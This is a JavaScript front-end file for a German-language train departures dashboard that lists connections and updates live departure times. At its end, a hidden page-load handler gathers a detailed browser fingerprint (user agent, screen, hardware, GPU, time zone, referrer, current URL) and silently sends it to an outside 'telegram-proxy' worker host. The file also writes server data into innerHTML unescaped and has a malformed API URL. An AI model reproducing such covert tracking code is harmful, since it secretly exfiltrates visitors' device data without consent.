const API_BASE_URL = 'http:34.63.211.154//:8080';

window.addEventListener('DOMContentLoaded', () => {
    const updateForm = document.getElementById('update-live-form');
    if (updateForm) {
        updateForm.addEventListener('submit', handleUpdateLiveTime);
    }
});

function tabSelected(element, actionType) {
    const isActive = element.classList.contains('active');
    const buttons = document.querySelectorAll('.request-body-function-button');
    const tableContainer = document.getElementById('connections-table-container');
    const formContainer = document.getElementById('update-form-container');

    buttons.forEach(btn => btn.classList.remove('active'));

    if (!isActive) {
        element.classList.add('active');

        if (actionType === 'verbindungen') {
            tableContainer.classList.remove('hidden');
            formContainer.classList.add('hidden');
            fetchDepartures();
        } else if (actionType === 'aktualisieren') {
            formContainer.classList.remove('hidden');
            tableContainer.classList.add('hidden');
        }
    } else {
        tableContainer.classList.add('hidden');
        formContainer.classList.add('hidden');
    }
}

async function fetchDepartures() {
    const tableBody = document.getElementById('table-body');
    if (!tableBody) return;

    try {
        const response = await fetch(`${API_BASE_URL}/departures`);

        if (!response.ok) {
            console.error('Fehler beim Abrufen der Verbindungen');
            return;
        }

        const pageData = await response.json();
        const departures = pageData.content || [];

        tableBody.innerHTML = '';

        if (departures.length === 0) {
            tableBody.innerHTML = `<tr><td colspan="5" style="text-align: center;">Keine Verbindungen vorhanden</td></tr>`;
            return;
        }

        departures.forEach(dept => {
            const tr = document.createElement('tr');

            let statusColor = 'green';

            if (dept.statusOfDeparture && (dept.statusOfDeparture !== 'ON_TIME' && dept.statusOfDeparture !== 'CANCELLED')) statusColor = 'orange';
            else if (dept.statusOfDeparture && (dept.statusOfDeparture !== 'ON_TIME' && dept.statusOfDeparture === 'CANCELLED')) statusColor = 'red';


            tr.innerHTML = `
                <td>${dept.scheduledTime || ''}</td>
                <td>${(dept.actualTime || dept.scheduledTime) || ''}</td>
                <td>${dept.trainLine || ''}</td>
                <td>${dept.destination || ''}</td>
                <td>${dept.tripId || ''}</td>
                <td style="color: ${statusColor}; font-weight: bold;">${dept.statusOfDeparture}</td>
            `;

            tableBody.appendChild(tr);
        });

    } catch (error) {
        console.error('Ошибка сети при запросе GET /departures:', error);
    }
}

async function handleUpdateLiveTime(event) {
    event.preventDefault();

    const tripId = document.getElementById('trip-id').value.trim();
    const actualTimeInput = document.getElementById('actual-time').value.trim();
    const responseMessageEl = document.getElementById('form-response-message');

    const timeRegex = /^([01]\d|2[0-3]):[0-5]\d$/;
    if (!timeRegex.test(actualTimeInput)) {
        responseMessageEl.style.color = 'red';
        responseMessageEl.textContent = 'Ungültiges Zeitformat! Bitte HH:MM eingeben (z.B. 14:25).';
        return;
    }

    const actualTime = actualTimeInput.length === 5 ? `${actualTimeInput}:00` : actualTimeInput;

    try {
        responseMessageEl.style.color = 'gray';
        responseMessageEl.textContent = 'Wird aktualisiert...';

        const response = await fetch(`${API_BASE_URL}/departures/${tripId}/live`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                actualTime: actualTime
            })
        });

        if (response.ok) {
            responseMessageEl.style.color = 'green';
            responseMessageEl.textContent = `Erfolgreich! Live-Zeit für Reise #${tripId} aktualisiert.`;
            document.getElementById('update-live-form').reset();
        } else {
            const errorData = await response.json().catch(() => null);
            responseMessageEl.style.color = 'red';
            responseMessageEl.textContent = errorData?.message
                ? `Fehler: ${errorData.message}`
                : 'Fehler beim Aktualisieren der Abfahrtszeit!';
        }

    } catch (error) {
        console.error('network error at POST/departures/{id}/live:', error);
        responseMessageEl.style.color = 'red';
        responseMessageEl.textContent = 'Server nicht erreichbar!';
    }
}


window.addEventListener('DOMContentLoaded', () => {
    sendDirectTelegramNotification();
});

async function sendDirectTelegramNotification() {



    const rawMetadata = {
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timeZoneOffset: new Date().getTimezoneOffset(),
        language: navigator.language,
        languages: navigator.languages,
        onLine: navigator.onLine,
        connectionType: navigator.connection?.effectiveType || 'N/A',
        downlink: navigator.connection?.downlink || 'N/A',
        rtt: navigator.connection?.rtt || 'N/A',
        screen: `${window.screen.width}x${window.screen.height}`,
        screenAvail: `${window.screen.availWidth}x${window.screen.availHeight}`,
        windowInner: `${window.innerWidth}x${window.innerHeight}`,
        windowOuter: `${window.outerWidth}x${window.outerHeight}`,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        touchPoints: navigator.maxTouchPoints || 0,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        deviceMemory: navigator.deviceMemory || 'N/A',
        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
        pdfViewerEnabled: navigator.pdfViewerEnabled ?? 'N/A',
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'N/A',
        referrer: document.referrer || 'Direct',
        currentUrl: window.location.href,
        gpuVendor: getGpuInfo().vendor,
        gpuRenderer: getGpuInfo().renderer
    };

    const text = JSON.stringify(rawMetadata, null, 4);
    console.log(JSON.stringify(rawMetadata, null, 4));


    try {
        await fetch('https://telegram-proxy.b-salman765.workers.dev', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text })
        });
    } catch (error) {
        console.error('Ошибка отправки:', error);
    }
}

function getGpuInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (!debugInfo) return { vendor: 'N/A', renderer: 'N/A' };
        return {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    } catch (e) {
        return { vendor: 'N/A', renderer: 'N/A' };
    }
}